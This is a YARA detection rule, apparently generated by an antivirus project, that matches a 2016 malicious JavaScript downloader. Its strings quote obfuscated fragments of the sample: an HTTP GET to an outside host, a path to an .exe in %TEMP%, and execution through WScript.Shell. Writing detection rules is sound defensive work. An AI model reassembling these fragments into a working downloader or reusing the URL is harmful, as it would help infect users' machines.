rule sig_20160328_f429ddd707101a511713bec686ceaa11 {
  meta:
    description = "datamaliciousorder - file 20160328_f429ddd707101a511713bec686ceaa11.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a7d7e157df94a04a591d5bf7c6310a23fc9cbf8c3e1ac6642a9c066ea1af9f5c"

  strings:
    $s1  = "function Mxfxvvxr() {return Ukkonkycm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"RRuhP5m5wR7I7.exe\";};" fullword ascii
    $s2  = "do {WScript[Bsqtoiqsj](Jhxetppphm() * 11)} while (Yersh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Tgxqkfjpy(Hfyrnz, Nhmdqhjup){return Hfyrnz - Nhmdqhjup;};" fullword ascii
    $s4  = "var Ukkonkycm = function Przexhb() {return WScript[Ppjze](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Yersh[Piqzlrsx](\"GET\", \"http://happyweek.us/kei3a\", false);" fullword ascii
    $s6  = "function Qlmfhbxmd(Zjuxm){Ukkonkycm[\"Run\"](Zjuxm, Yqcxojl, Yqcxojl);};" fullword ascii
    $s7  = "function Acydfcf() {return ((Exogtc == true) && (Exogtc == Ahgex)) ? 1 : Yqcxojl;};" fullword ascii
    $s8  = "var Ahgex = false;" fullword ascii
    $s9  = "return Tgxqkfjpy(Kanomgbo, Pqwlrfpegx);" fullword ascii
    $s10 = "Exogtc = true; " fullword ascii
    $s11 = "Ahgex = true; " fullword ascii
    $s12 = "function Rcdebt()" fullword ascii
    $s13 = "var Mavxczox = new this[\"Date\"]();" fullword ascii
    $s14 = "var Exogtc = false;" fullword ascii
    $s15 = "function Clxndja(){return Ppjze;};" fullword ascii
    $s16 = " while (Mtplov){" fullword ascii
    $s17 = "var Mxicmfenn = false;" fullword ascii
    $s18 = "function Vrnyo(Oilajjmfbe) {var Dgnoer = (1, 2, 3, 4, 5, Oilajjmfbe); return Dgnoer;};" fullword ascii
    $s19 = "function Vecnb(){return Rahsac;};" fullword ascii
    $s20 = "function Jhxetppphm(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}